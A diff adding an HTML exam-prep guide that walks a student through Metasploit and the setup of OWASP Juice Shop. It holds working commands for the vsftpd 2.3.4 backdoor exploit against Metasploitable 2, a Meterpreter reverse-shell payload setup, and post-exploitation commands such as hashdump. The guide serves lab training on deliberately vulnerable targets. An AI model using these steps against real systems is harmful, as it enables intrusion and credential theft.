@@ -1,0 +1,610 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
+<meta name="color-scheme" content="light" />
+<link rel="icon" href="data:," />
+<title>Cyber Security Test Prep Guide — Metasploit & Juice Shop</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Sora:wght@500;600;700;800&family=Source+Sans+3:wght@400;600;700&family=IBM+Plex+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --bg:#f7f5f0; --bg2:#ffffff; --ink:#1a2332; --muted:#5b6b82; --line:#e2ddd2;
+    --teal:#0f766e; --teal-bg:#e6f4f1; --teal-ink:#0b4f4a;
+    --amber:#b45309; --amber-bg:#fef3c7; --amber-ink:#78350f;
+    --rose:#be123c; --rose-bg:#fff1f2;
+    --code-bg:#111827; --code-ink:#e5e7eb; --code-accent:#5eead4; --code-dim:#9ca3af;
+    --card-shadow:0 1px 3px rgba(26,35,50,.07),0 8px 24px rgba(26,35,50,.05);
+    --radius:16px;
+  }
+  /* Light theme only */
+  *{box-sizing:border-box}
+  html{scroll-behavior:smooth;scroll-padding-top:84px}
+  body{margin:0;background:var(--bg);color:var(--ink);font-family:"Source Sans 3",system-ui,sans-serif;font-size:17px;line-height:1.65;-webkit-font-smoothing:antialiased}
+  h1,h2,h3,h4{font-family:"Sora",sans-serif;line-height:1.2;margin:0}
+  a{color:var(--teal)}
+  code{font-family:"IBM Plex Mono",monospace;font-size:.88em;background:var(--teal-bg);color:var(--teal-ink);padding:.1em .35em;border-radius:6px;word-break:break-word}
+  .wrap{max-width:1020px;margin:0 auto;padding:0 20px}
+
+  /* Nav */
+  .topnav{position:sticky;top:0;z-index:50;background:color-mix(in srgb,var(--bg) 88%,transparent);backdrop-filter:blur(10px);border-bottom:1px solid var(--line)}
+  .topnav-inner{max-width:1020px;margin:0 auto;padding:10px 20px;display:flex;gap:8px;overflow-x:auto;scrollbar-width:none;-webkit-overflow-scrolling:touch}
+  .topnav-inner::-webkit-scrollbar{display:none}
+  .topnav a{flex:0 0 auto;text-decoration:none;color:var(--ink);font-weight:600;font-size:.9rem;padding:9px 14px;border-radius:999px;border:1px solid var(--line);background:var(--bg2);min-height:38px;display:inline-flex;align-items:center}
+  .topnav a.active{background:var(--ink);color:var(--bg);border-color:var(--ink)}
+
+  /* Hero */
+  .hero{padding:44px 0 8px}
+  .hero-badge{display:inline-flex;align-items:center;gap:8px;background:var(--amber-bg);color:var(--amber-ink);font-weight:700;font-size:.85rem;padding:7px 13px;border-radius:999px;border:1px solid color-mix(in srgb,var(--amber) 25%,transparent)}
+  .hero h1{font-size:clamp(2rem,6vw,3.4rem);font-weight:800;letter-spacing:-.02em;margin:18px 0 14px;max-width:14ch}
+  .hero h1 em{font-style:normal;color:var(--teal)}
+  .hero p.lead{font-size:1.15rem;color:var(--muted);max-width:62ch;margin:0 0 26px}
+  .hero-cards{display:grid;grid-template-columns:1fr 1fr;gap:14px;margin:8px 0 10px}
+  @media(max-width:640px){.hero-cards{grid-template-columns:1fr}}
+  .hero-card{background:var(--bg2);border:1px solid var(--line);border-radius:var(--radius);padding:20px;box-shadow:var(--card-shadow);text-decoration:none;color:var(--ink);display:block}
+  .hero-card:hover{border-color:var(--teal)}
+  .hero-card .num{font-family:"IBM Plex Mono",monospace;font-size:.8rem;font-weight:600;color:var(--teal);letter-spacing:.06em}
+  .hero-card h3{font-size:1.25rem;margin:6px 0 6px}
+  .hero-card p{margin:0;color:var(--muted);font-size:.97rem}
+  .hero-card .go{margin-top:12px;font-weight:700;color:var(--teal);font-size:.92rem}
+  .exam-strip{margin-top:16px;background:var(--ink);color:var(--bg);border-radius:var(--radius);padding:18px 20px;display:grid;grid-template-columns:repeat(3,1fr);gap:14px;text-align:center}
+  @media(max-width:640px){.exam-strip{grid-template-columns:1fr;text-align:left}}
+  .exam-strip b{font-family:"Sora",sans-serif;font-size:1.5rem;display:block}
+  .exam-strip span{font-size:.9rem;opacity:.75}
+
+  section{padding:42px 0 6px}
+  .sec-head{margin-bottom:20px}
+  .sec-head .kicker{font-family:"IBM Plex Mono",monospace;font-size:.78rem;font-weight:600;letter-spacing:.1em;text-transform:uppercase;color:var(--teal)}
+  .sec-head h2{font-size:clamp(1.6rem,4vw,2.15rem);font-weight:700;margin:8px 0 8px;letter-spacing:-.01em}
+  .sec-head p{color:var(--muted);margin:0;max-width:66ch}
+  h3.sub{font-size:1.2rem;margin:30px 0 10px;display:flex;align-items:center;gap:10px}
+  h3.sub:first-of-type{margin-top:6px}
+  p{margin:0 0 12px}
+  ul,ol{margin:0 0 14px;padding-left:22px}
+  li{margin-bottom:6px}
+  li::marker{color:var(--teal);font-weight:700}
+
+  /* Steps */
+  .steps{display:flex;flex-direction:column;gap:12px;margin:14px 0 20px}
+  .step{background:var(--bg2);border:1px solid var(--line);border-radius:var(--radius);padding:18px 18px 14px;display:grid;grid-template-columns:44px 1fr;gap:14px;box-shadow:var(--card-shadow)}
+  @media(max-width:520px){.step{grid-template-columns:1fr}.step .n{margin-bottom:2px}}
+  .step .n{width:44px;height:44px;border-radius:12px;background:var(--teal);color:#fff;font-family:"Sora",sans-serif;font-weight:700;font-size:1.1rem;display:flex;align-items:center;justify-content:center}
+  .step h4{font-size:1.05rem;margin:2px 0 6px}
+  .step p{color:var(--muted);margin:0 0 8px}
+  .step p:last-child{margin-bottom:4px}
+
+  /* Code */
+  .codeblock{background:var(--code-bg);border-radius:14px;margin:10px 0 14px;overflow:hidden;border:1px solid rgba(255,255,255,.06)}
+  .codeblock-head{display:flex;justify-content:space-between;align-items:center;padding:8px 12px 8px 16px;border-bottom:1px solid rgba(255,255,255,.08)}
+  .codeblock-head span{font-family:"IBM Plex Mono",monospace;font-size:.75rem;color:var(--code-dim);letter-spacing:.05em;text-transform:uppercase}
+  .copy-btn{font-family:"IBM Plex Mono",monospace;font-size:.78rem;font-weight:600;background:rgba(255,255,255,.08);color:#e5e7eb;border:1px solid rgba(255,255,255,.14);border-radius:8px;padding:7px 12px;cursor:pointer;min-height:34px}
+  .copy-btn:active{transform:scale(.97)}
+  .codeblock pre{margin:0;padding:14px 16px;overflow-x:auto}
+  .codeblock code{background:none;color:var(--code-ink);padding:0;font-size:.86rem;line-height:1.7;white-space:pre-wrap;word-break:break-word;display:block}
+  .codeblock .c{color:var(--code-dim)}
+  .codeblock .a{color:var(--code-accent)}
+
+  /* Tables — stacked on mobile */
+  .cmd-table{width:100%;border-collapse:collapse;background:var(--bg2);border:1px solid var(--line);border-radius:var(--radius);overflow:hidden;margin:12px 0 20px;box-shadow:var(--card-shadow)}
+  .cmd-table th{font-family:"Sora",sans-serif;text-align:left;font-size:.82rem;letter-spacing:.05em;text-transform:uppercase;background:var(--teal-bg);color:var(--teal-ink);padding:12px 16px}
+  .cmd-table td{padding:11px 16px;border-top:1px solid var(--line);vertical-align:top}
+  .cmd-table td:first-child{white-space:nowrap}
+  @media(max-width:640px){
+    .cmd-table thead{display:none}
+    .cmd-table,.cmd-table tbody,.cmd-table tr,.cmd-table td{display:block;width:100%}
+    .cmd-table tr{padding:10px 0;border-top:1px solid var(--line)}
+    .cmd-table tr:first-child{border-top:none}
+    .cmd-table td{border-top:none;padding:2px 16px}
+    .cmd-table td:first-child{padding-top:6px}
+    .cmd-table td:last-child{padding-bottom:8px;color:var(--muted)}
+  }
+
+  .callout{border-radius:var(--radius);padding:16px 18px;margin:14px 0 20px;font-size:.98rem}
+  .callout b.t{display:block;font-family:"Sora",sans-serif;font-size:.95rem;margin-bottom:4px}
+  .callout p{margin:0}
+  .callout.tip{background:var(--amber-bg);color:var(--amber-ink);border:1px solid color-mix(in srgb,var(--amber) 25%,transparent)}
+  .callout.good{background:var(--teal-bg);color:var(--teal-ink);border:1px solid color-mix(in srgb,var(--teal) 25%,transparent)}
+  .callout.warn{background:var(--rose-bg);color:var(--ink);border:1px solid color-mix(in srgb,var(--rose) 30%,transparent)}
+  .callout.warn b.t{color:var(--rose)}
+
+  .flow{display:flex;flex-wrap:wrap;gap:8px;align-items:center;margin:12px 0 18px}
+  .flow .f{background:var(--ink);color:var(--bg);font-family:"IBM Plex Mono",monospace;font-size:.85rem;font-weight:600;padding:9px 14px;border-radius:10px}
+  .flow .arr{color:var(--muted);font-weight:700}
+
+  .grid2{display:grid;grid-template-columns:1fr 1fr;gap:14px;margin:12px 0 18px}
+  @media(max-width:680px){.grid2{grid-template-columns:1fr}}
+  .mini-card{background:var(--bg2);border:1px solid var(--line);border-radius:var(--radius);padding:18px;box-shadow:var(--card-shadow)}
+  .mini-card h4{font-size:1.02rem;margin:0 0 8px}
+  .mini-card p,.mini-card li{color:var(--muted);font-size:.96rem}
+  .mini-card ul{margin-bottom:0}
+
+  /* Checklist */
+  .checklist{list-style:none;padding:0;margin:12px 0 20px;display:grid;grid-template-columns:1fr 1fr;gap:10px}
+  @media(max-width:680px){.checklist{grid-template-columns:1fr}}
+  .checklist li{background:var(--bg2);border:1px solid var(--line);border-radius:12px;padding:13px 15px 13px 46px;position:relative;margin:0;box-shadow:var(--card-shadow);font-size:.97rem}
+  .checklist li::before{content:"✓";position:absolute;left:13px;top:11px;width:22px;height:22px;border-radius:7px;background:var(--teal-bg);color:var(--teal);font-weight:800;font-size:.8rem;display:flex;align-items:center;justify-content:center}
+  .checklist li b{display:block;font-family:"Sora",sans-serif;font-size:.93rem}
+  .checklist li span{color:var(--muted)}
+
+  .payload{font-family:"IBM Plex Mono",monospace;font-size:1rem;font-weight:600;background:var(--code-bg);color:#fbbf24;border-radius:12px;padding:14px 16px;margin:10px 0;word-break:break-all;line-height:1.6}
+  .payload small{display:block;color:var(--code-dim);font-size:.75rem;font-weight:400;letter-spacing:.05em;text-transform:uppercase;margin-bottom:4px}
+
+  footer{margin-top:44px;border-top:1px solid var(--line);padding:26px 0 40px;color:var(--muted);font-size:.93rem}
+  .divider{height:1px;background:var(--line);margin:36px 0 0}
+  .remember{background:var(--bg2);border:1px solid var(--line);border-left:5px solid var(--teal);border-radius:12px;padding:16px 18px;margin:14px 0}
+  .remember p{margin:0}
+  @media print{.topnav,.copy-btn{display:none}body{background:#fff}}
+</style>
+</head>
+<body>
+
+<nav class="topnav" aria-label="Guide sections">
+  <div class="topnav-inner" id="navInner">
+    <a href="#start" class="active">Start Here</a>
+    <a href="#strategy">Exam Strategy</a>
+    <a href="#metasploit">1 · Metasploit</a>
+    <a href="#juiceshop">2 · Juice Shop</a>
+    <a href="#checklist">Revision Checklist</a>
+  </div>
+</nav>
+
+<div class="wrap">
+
+  <!-- HERO -->
+  <header class="hero" id="start">
+    <span class="hero-badge">⏰ Test tomorrow — practical only, no theory</span>
+    <h1>Pass your Cyber Security practical, <em>step by step.</em></h1>
+    <p class="lead">Sadaf, this guide covers exactly what is in your test — nothing extra. Read it once tonight, then practise each walkthrough with your own hands. In the test you will not need to remember theory. You will need to <strong>do</strong> these steps, in order, without getting stuck.</p>
+
+    <div class="hero-cards">
+      <a class="hero-card" href="#metasploit">
+        <span class="num">QUESTION TOPIC 01</span>
+        <h3>Metasploit on Ubuntu</h3>
+        <p>Install it, start it, find an exploit, set the target, and run it — plus the Meterpreter commands you get after a successful attack.</p>
+        <span class="go">Start Topic 1 →</span>
+      </a>
+      <a class="hero-card" href="#juiceshop">
+        <span class="num">QUESTION TOPIC 02</span>
+        <h3>OWASP Juice Shop</h3>
+        <p>Run the shop with Docker, find the hidden Score Board, and solve the 3 most common challenges: SQL injection, XSS, and viewing another user's basket.</p>
+        <span class="go">Start Topic 2 →</span>
+      </a>
+    </div>
+
+    <div class="exam-strip">
+      <div><b>3</b><span>questions in the paper</span></div>
+      <div><b>2</b><span>you must attempt</span></div>
+      <div><b>100%</b><span>practical work on the computer</span></div>
+    </div>
+  </header>
+
+  <!-- STRATEGY -->
+  <section id="strategy">
+    <div class="sec-head">
+      <span class="kicker">Before you open any tool</span>
+      <h2>Exam strategy — how to pick your 2 questions</h2>
+      <p>You do not need to be perfect at everything. You need two solid questions. Use this plan.</p>
+    </div>
+
+    <div class="steps">
+      <div class="step"><div class="n">1</div><div>
+        <h4>Read all 3 questions first (2 minutes)</h4>
+        <p>Do not start typing immediately. Read every question once. You are looking for the two that match what you practised — Metasploit and Juice Shop are your strongest topics, so prefer those.</p>
+      </div></div>
+      <div class="step"><div class="n">2</div><div>
+        <h4>Attempt your strongest question first</h4>
+        <p>Start with the topic you can do almost from memory. Finishing one full question early removes pressure and gives you confidence for the second one.</p>
+      </div></div>
+      <div class="step"><div class="n">3</div><div>
+        <h4>Divide your time — and set a "move on" limit</h4>
+        <p>Split the total time roughly in half for your two questions. If one step is stuck for more than 10–15 minutes (a command fails, a page won't load), write down what you tried, move to the next part, and come back later if time remains. A half-finished second question earns more than one perfect question and one blank.</p>
+      </div></div>
+      <div class="step"><div class="n">4</div><div>
+        <h4>Show your working at every stage</h4>
+        <p>In practical tests, marks often come from visible steps and results. Keep your terminal open, do not clear the screen, and if the question asks for proof, take the screenshot / copy the output exactly as instructed before closing anything.</p>
+      </div></div>
+      <div class="step"><div class="n">5</div><div>
+        <h4>If something fails, check the boring things first</h4>
+        <p>Most practical failures are simple: wrong IP address, target machine not started, Docker container not running, or a typo. Before panicking, check: Is the target on? Did I <code>ping</code> it? Did I set <code>RHOSTS</code> correctly? Is the website open at the right port?</p>
+      </div></div>
+    </div>
+
+    <div class="callout warn">
+      <b class="t">⚠ Only practise on your lab machines</b>
+      <p>Everything in this guide is for your own test lab — your Ubuntu machine, your Metasploitable target, and your own Juice Shop. That is exactly what your test uses. Never run these tools against any other system.</p>
+    </div>
+  </section>
+
+  <div class="divider"></div>
+
+  <!-- METASPLOIT -->
+  <section id="metasploit">
+    <div class="sec-head">
+      <span class="kicker">Topic 1</span>
+      <h2>Metasploit on Ubuntu</h2>
+      <p><strong>What is it, in one line?</strong> Metasploit is a free tool that contains thousands of ready-made attacks (called <em>exploits</em>). You pick an exploit, tell it the target computer's IP address, and run it. If the target is vulnerable, you get access to it.</p>
+    </div>
+
+    <div class="flow" aria-label="Core workflow">
+      <span class="f">search</span><span class="arr">→</span>
+      <span class="f">use</span><span class="arr">→</span>
+      <span class="f">show options</span><span class="arr">→</span>
+      <span class="f">set</span><span class="arr">→</span>
+      <span class="f">exploit</span>
+    </div>
+    <p>Memorise this 5-word flow. Almost every Metasploit question follows it.</p>
+
+    <h3 class="sub">Part A — Install and start Metasploit</h3>
+    <p>On many lab machines Metasploit is already installed. Try starting it first (step 3). Only install if the start command says "command not found".</p>
+
+    <div class="steps">
+      <div class="step"><div class="n">1</div><div>
+        <h4>Install with the official Rapid7 installer (only if needed)</h4>
+        <p>Metasploit is <strong>not</strong> in Ubuntu's normal app store (<code>apt install metasploit-framework</code> will say "package not found" — that package is for Kali Linux). On Ubuntu, use the free official installer from Rapid7, the company that makes Metasploit. Open a terminal and run these one by one:</p>
+        <div class="codeblock"><div class="codeblock-head"><span>Terminal — Ubuntu</span><button class="copy-btn" data-copy>Copy</button></div><pre><code>curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall
+chmod 755 msfinstall
+./msfinstall</code></pre></div>
+        <p>The first line downloads the installer and saves it as a file called <code>msfinstall</code>. The second line makes it runnable. The third line runs it — type your Ubuntu password when asked (the screen shows nothing while you type — that is normal). Installation takes a few minutes.</p>
+      </div></div>
+      <div class="step"><div class="n">2</div><div>
+        <h4>Start the database (do this once)</h4>
+        <p>Metasploit uses a small database to remember scan results. Start it with:</p>
+        <div class="codeblock"><div class="codeblock-head"><span>Terminal — Ubuntu</span><button class="copy-btn" data-copy>Copy</button></div><pre><code>sudo msfdb init
+sudo msfdb status</code></pre></div>
+        <p>If <code>msfdb status</code> shows the database is running / connected, you are ready. If your lab uses Kali-style setup and this command is missing, skip it — <code>msfconsole</code> still works for the test.</p>
+      </div></div>
+      <div class="step"><div class="n">3</div><div>
+        <h4>Start Metasploit</h4>
+        <div class="codeblock"><div class="codeblock-head"><span>Terminal — Ubuntu</span><button class="copy-btn" data-copy>Copy</button></div><pre><code>sudo msfconsole</code></pre></div>
+        <p>Wait a few seconds. You will see a banner and the prompt will change to <code>msf6 &gt;</code>. That prompt means you are now <em>inside</em> Metasploit. All commands from here are typed at this prompt — not in the normal terminal.</p>
+      </div></div>
+    </div>
+
+    <div class="callout tip"><b class="t">💡 Easy check</b><p>Type <code>version</code> at the <code>msf6 &gt;</code> prompt. If it prints the Metasploit version, everything is working. Type <code>exit</code> any time to leave Metasploit and return to the normal terminal.</p></div>
+
+    <h3 class="sub">Part B — The core workflow (the heart of the question)</h3>
+
+    <div class="steps">
+      <div class="step"><div class="n">1</div><div>
+        <h4><code>search</code> — find an exploit</h4>
+        <p>Search by the name of the software or service on the target. Example — searching for VSFTPD exploits:</p>
+        <div class="codeblock"><div class="codeblock-head"><span>msf6 prompt</span><button class="copy-btn" data-copy>Copy</button></div><pre><code><span class="a">search</span> vsftpd</code></pre></div>
+        <p>A list appears. Each line has a number, a module name (like <code>exploit/unix/ftp/vsftpd_234_backdoor</code>), and a rank. <strong>Excellent</strong> and <strong>Great</strong> ranks are the most reliable.</p>
+      </div></div>
+      <div class="step"><div class="n">2</div><div>
+        <h4><code>use</code> — select the exploit</h4>
+        <p>Select it by its number from the list, or by its full name. Using the number is faster:</p>
+        <div class="codeblock"><div class="codeblock-head"><span>msf6 prompt</span><button class="copy-btn" data-copy>Copy</button></div><pre><code><span class="a">use</span> 0
+<span class="c"># or, by full name:</span>
+<span class="a">use</span> exploit/unix/ftp/vsftpd_234_backdoor</code></pre></div>
+        <p>The prompt changes to show the module name, e.g. <code>msf6 exploit(unix/ftp/vsftpd_234_backdoor) &gt;</code>. That confirms your selection.</p>
+      </div></div>
+      <div class="step"><div class="n">3</div><div>
+        <h4><code>show options</code> — see what you must fill in</h4>
+        <div class="codeblock"><div class="codeblock-head"><span>msf6 prompt</span><button class="copy-btn" data-copy>Copy</button></div><pre><code><span class="a">show options</span></code></pre></div>
+        <p>A table appears. Look at the <strong>Required = yes</strong> rows with an empty <strong>Current Setting</strong>. The most common one is <code>RHOSTS</code> — the target's IP address. <code>RPORT</code> (target port) is usually already filled in correctly.</p>
+      </div></div>
+      <div class="step"><div class="n">4</div><div>
+        <h4><code>set</code> — fill in the options</h4>
+        <div class="codeblock"><div class="codeblock-head"><span>msf6 prompt</span><button class="copy-btn" data-copy>Copy</button></div><pre><code><span class="a">set</span> RHOSTS 192.168.1.105
+<span class="a">set</span> RPORT 21</code></pre></div>
+        <p>Replace <code>192.168.1.105</code> with <em>your</em> target machine's real IP (see the worked example below for how to find it). After each <code>set</code>, Metasploit confirms: <code>RHOSTS =&gt; 192.168.1.105</code>. Run <code>show options</code> once more to double-check before running.</p>
+      </div></div>
+      <div class="step"><div class="n">5</div><div>
+        <h4><code>exploit</code> — run the attack</h4>
+        <div class="codeblock"><div class="codeblock-head"><span>msf6 prompt</span><button class="copy-btn" data-copy>Copy</button></div><pre><code><span class="a">exploit</span>
+<span class="c"># "run" does exactly the same thing:</span>
+<span class="a">run</span></code></pre></div>
+        <p>Watch the output. Success usually looks like <em>"Command shell session 1 opened"</em> or <em>"Meterpreter session 1 opened"</em>. If it says the target is not vulnerable or the connection failed, check the IP and try <code>check</code> (explained below) — do not just keep pressing exploit.</p>
+      </div></div>
+    </div>
+
+    <h3 class="sub">Part C — Key commands to remember</h3>
+    <table class="cmd-table">
+      <thead><tr><th>Command</th><th>What it does</th></tr></thead>
+      <tbody>
+        <tr><td><code>help</code></td><td>Shows all commands. Use it if you forget anything.</td></tr>
+        <tr><td><code>search &lt;name&gt;</code></td><td>Finds exploits / modules matching a name, e.g. <code>search smb</code>.</td></tr>
+        <tr><td><code>use &lt;number or name&gt;</code></td><td>Selects a module from the search results.</td></tr>
+        <tr><td><code>info</code></td><td>Full description of the selected module — what it attacks and who wrote it.</td></tr>
+        <tr><td><code>show options</code></td><td>Lists settings you must fill in (RHOSTS, RPORT, etc.).</td></tr>
+        <tr><td><code>set &lt;option&gt; &lt;value&gt;</code></td><td>Sets one option, e.g. <code>set RHOSTS 192.168.1.105</code>.</td></tr>
+        <tr><td><code>set PAYLOAD &lt;name&gt;</code></td><td>Chooses what runs after the exploit works (needed for Meterpreter — see Part E).</td></tr>
+        <tr><td><code>show payloads</code></td><td>Lists payloads that work with the selected exploit.</td></tr>
+        <tr><td><code>check</code></td><td>Tests if the target looks vulnerable — without fully exploiting it.</td></tr>
+        <tr><td><code>exploit</code> / <code>run</code></td><td>Runs the attack.</td></tr>
+        <tr><td><code>back</code></td><td>Leaves the current module and returns to the main <code>msf6 &gt;</code> prompt.</td></tr>
+        <tr><td><code>sessions</code></td><td>Lists your open connections (sessions) to targets you have exploited.</td></tr>
+        <tr><td><code>sessions -i 1</code></td><td>Re-enters session number 1.</td></tr>
+        <tr><td><code>exit</code></td><td>Closes Metasploit completely.</td></tr>
+      </tbody>
+    </table>
+
+    <p><strong>Words you will see in options:</strong> <code>RHOSTS</code> = remote host = the <em>target</em>. <code>RPORT</code> = target's port. <code>LHOST</code> = local host = <em>your</em> Ubuntu machine's IP (needed for some payloads). <code>LPORT</code> = the port on your machine that listens for the connection back.</p>
+
+    <h3 class="sub">Part D — Full worked example: VSFTPD backdoor vs Metasploitable</h3>
+    <p>This is the most common lab practical: the target is <strong>Metasploitable 2</strong>, a machine made deliberately vulnerable for learning. It runs an old FTP server, <strong>vsftpd 2.3.4</strong>, which contains a hidden backdoor. Follow it exactly.</p>
+
+    <div class="steps">
+      <div class="step"><div class="n">1</div><div>
+        <h4>Start both machines and find the target's IP</h4>
+        <p>Start your Ubuntu (attacker) and Metasploitable (target) machines. On Metasploitable, log in (default username and password are both <code>msfadmin</code>) and type <code>ifconfig</code>. Note the IP — for example <code>192.168.1.105</code>. <em>Your IP will be different — always use your own.</em></p>
+      </div></div>
+      <div class="step"><div class="n">2</div><div>
+        <h4>Confirm the target is reachable and scan it (in Ubuntu terminal)</h4>
+        <div class="codeblock"><div class="codeblock-head"><span>Terminal — Ubuntu</span><button class="copy-btn" data-copy>Copy</button></div><pre><code>ping -c 3 192.168.1.105
+nmap -sV 192.168.1.105</code></pre></div>
+        <p><code>ping</code> should get replies — if not, the machines are not on the same network; fix that first. In the <code>nmap</code> result, look for port <strong>21</strong> showing <strong>vsftpd 2.3.4</strong>. That line is your proof the target has the vulnerable service.</p>
+      </div></div>
+      <div class="step"><div class="n">3</div><div>
+        <h4>Open Metasploit and search</h4>
+        <div class="codeblock"><div class="codeblock-head"><span>Terminal → msf6 prompt</span><button class="copy-btn" data-copy>Copy</button></div><pre><code>sudo msfconsole
+search vsftpd</code></pre></div>
+      </div></div>
+      <div class="step"><div class="n">4</div><div>
+        <h4>Select the backdoor exploit and view its options</h4>
+        <div class="codeblock"><div class="codeblock-head"><span>msf6 prompt</span><button class="copy-btn" data-copy>Copy</button></div><pre><code>use exploit/unix/ftp/vsftpd_234_backdoor
+show options</code></pre></div>
+        <p>You will see <code>RHOSTS</code> is required and empty, and <code>RPORT</code> is already <code>21</code>.</p>
+      </div></div>
+      <div class="step"><div class="n">5</div><div>
+        <h4>Set the target and run</h4>
+        <div class="codeblock"><div class="codeblock-head"><span>msf6 prompt</span><button class="copy-btn" data-copy>Copy</button></div><pre><code>set RHOSTS 192.168.1.105
+exploit</code></pre></div>
+        <p>Success looks like this:</p>
+        <div class="codeblock"><div class="codeblock-head"><span>Expected output</span><button class="copy-btn" data-copy>Copy</button></div><pre><code>[*] Banner: 220 (vsFTPd 2.3.4)
+[*] USER: 331 Please specify the password.
+[+] Backdoor service has been spawned, handling...
+[+] UID: uid=0(root) gid=0(root)
+[*] Command shell session 1 opened</code></pre></div>
+      </div></div>
+      <div class="step"><div class="n">6</div><div>
+        <h4>Prove you are inside the target</h4>
+        <p>You now have a shell on the target as <strong>root</strong> (the highest user). Run these to prove it — examiners love this output:</p>
+        <div class="codeblock"><div class="codeblock-head"><span>Inside the target shell</span><button class="copy-btn" data-copy>Copy</button></div><pre><code>whoami
+hostname
+ifconfig</code></pre></div>
+        <p><code>whoami</code> should answer <code>root</code>, and <code>ifconfig</code> should show the <em>target's</em> IP, not yours. Press <strong>Ctrl + C</strong> and answer <strong>y</strong> to close the session when you are done.</p>
+      </div></div>
+    </div>
+
+    <div class="callout tip"><b class="t">💡 If exploit fails, run this checklist</b><p>1) <code>ping</code> the target again. 2) Re-run <code>show options</code> — is RHOSTS exactly right, no extra spaces? 3) Was the nmap result really vsftpd <strong>2.3.4</strong>? A different version will not work with this exploit. 4) Try <code>check</code> to see Metasploit's own verdict.</p></div>
+
+    <h3 class="sub">Part E — Meterpreter basics (after a successful exploit)</h3>
+    <p>Some exploits give you a plain shell — the VSFTPD example above does exactly that, and that is fine. Others give you <strong>Meterpreter</strong> — a smarter, more powerful session with its own commands. You get Meterpreter when you select a Meterpreter payload <em>before</em> running the exploit. <strong>Important: the payload must match the target's system</strong> — a Linux target (like Metasploitable) needs a <code>linux/…</code> payload; a <code>windows/…</code> payload only works on a Windows target and will simply fail on Linux. For the Metasploitable target, for example:</p>
+    <div class="codeblock"><div class="codeblock-head"><span>msf6 prompt — before running exploit</span><button class="copy-btn" data-copy>Copy</button></div><pre><code>set PAYLOAD linux/x86/meterpreter/reverse_tcp
+set LHOST 192.168.1.100
+show options</code></pre></div>
+    <p>Here <code>LHOST</code> is <em>your</em> Ubuntu IP (find it with <code>ifconfig</code> in a second terminal) — the target connects <em>back</em> to you, which is why it is called <em>reverse</em>. Once you see <em>"Meterpreter session 1 opened"</em> and the prompt becomes <code>meterpreter &gt;</code>, use these commands:</p>
+
+    <table class="cmd-table">
+      <thead><tr><th>Meterpreter command</th><th>What it does</th></tr></thead>
+      <tbody>
+        <tr><td><code>sysinfo</code></td><td>Target's computer name, operating system, and architecture.</td></tr>
+        <tr><td><code>getuid</code></td><td>Which user you are running as on the target.</td></tr>
+        <tr><td><code>ipconfig</code></td><td>Target's network details (same idea as ifconfig).</td></tr>
+        <tr><td><code>ps</code></td><td>Lists programs currently running on the target.</td></tr>
+        <tr><td><code>pwd</code> / <code>ls</code></td><td>Shows your current folder / lists files in it.</td></tr>
+        <tr><td><code>download &lt;file&gt;</code></td><td>Copies a file from the target to your machine.</td></tr>
+        <tr><td><code>upload &lt;file&gt;</code></td><td>Copies a file from your machine to the target.</td></tr>
+        <tr><td><code>hashdump</code></td><td>Dumps the target's password hashes (Windows targets; needs admin rights).</td></tr>
+        <tr><td><code>screenshot</code></td><td>Takes a screenshot of the target's desktop.</td></tr>
+        <tr><td><code>shell</code></td><td>Drops you into the target's normal command shell. Type <code>exit</code> to return to Meterpreter.</td></tr>
+        <tr><td><code>background</code></td><td>Pauses this session and returns to <code>msf6 &gt;</code> — the session stays alive. Bring it back with <code>sessions -i 1</code>.</td></tr>
+        <tr><td><code>exit</code></td><td>Closes the Meterpreter session completely.</td></tr>
+      </tbody>
+    </table>
+
+    <div class="remember"><p><strong>The one idea to remember:</strong> a normal shell gives you the target's own basic commands. Meterpreter gives you extra ready-made commands (<code>sysinfo</code>, <code>hashdump</code>, <code>download</code>) that the target's own shell does not have.</p></div>
+  </section>
+
+  <div class="divider"></div>
+
+  <!-- JUICE SHOP -->
+  <section id="juiceshop">
+    <div class="sec-head">
+      <span class="kicker">Topic 2</span>
+      <h2>OWASP Juice Shop</h2>
+      <p><strong>What is it, in one line?</strong> Juice Shop is a fake online juice shop that OWASP built <em>deliberately full of security holes</em>. Your job is to find and exploit those holes — each one you solve is called a <strong>challenge</strong>, and the site keeps your score.</p>
+    </div>
+
+    <h3 class="sub">Part A — Set it up with Docker and open it</h3>
+    <div class="steps">
+      <div class="step"><div class="n">1</div><div>
+        <h4>Check Docker is installed</h4>
+        <div class="codeblock"><div class="codeblock-head"><span>Terminal — Ubuntu</span><button class="copy-btn" data-copy>Copy</button></div><pre><code>docker --version</code></pre></div>
+        <p>If a version number appears, Docker is ready. If not, install it with <code>sudo apt install docker.io -y</code>, then start it: <code>sudo systemctl start docker</code>.</p>
+      </div></div>
+      <div class="step"><div class="n">2</div><div>
+        <h4>Download and run Juice Shop (one command)</h4>
+        <div class="codeblock"><div class="codeblock-head"><span>Terminal — Ubuntu</span><button class="copy-btn" data-copy>Copy</button></div><pre><code>sudo docker pull bkimminich/juice-shop
+sudo docker run --rm -p 3000:3000 bkimminich/juice-shop</code></pre></div>
+        <p>The first command downloads the shop (only needed once). The second starts it. <code>-p 3000:3000</code> means "show the shop on port 3000 of this computer". When you see a message like <em>"Server listening on port 3000"</em>, it is running. <strong>Leave this terminal open</strong> — closing it stops the shop.</p>
+      </div></div>
+      <div class="step"><div class="n">3</div><div>
+        <h4>Open the shop in your browser</h4>
+        <div class="codeblock"><div class="codeblock-head"><span>Type in browser address bar</span><button class="copy-btn" data-copy>Copy</button></div><pre><code>http://localhost:3000</code></pre></div>
+        <p>You should see the juice shop homepage with products like Apple Juice. Dismiss the welcome banner and cookie notice (click <em>Dismiss</em> / <em>Me want it!</em>) so they stop covering the screen.</p>
+      </div></div>
+    </div>
+
+    <div class="callout tip"><b class="t">💡 Useful Docker commands</b><p>See what is running: <code>sudo docker ps</code> · Stop everything: press <strong>Ctrl + C</strong> in the terminal where Juice Shop runs (because of <code>--rm</code> it cleans itself up) · Start again any time with the same <code>docker run</code> command. Your challenge progress is stored in the browser, so solved challenges stay solved on the same browser.</p></div>
+
+    <h3 class="sub">Part B — Find the hidden Score Board</h3>
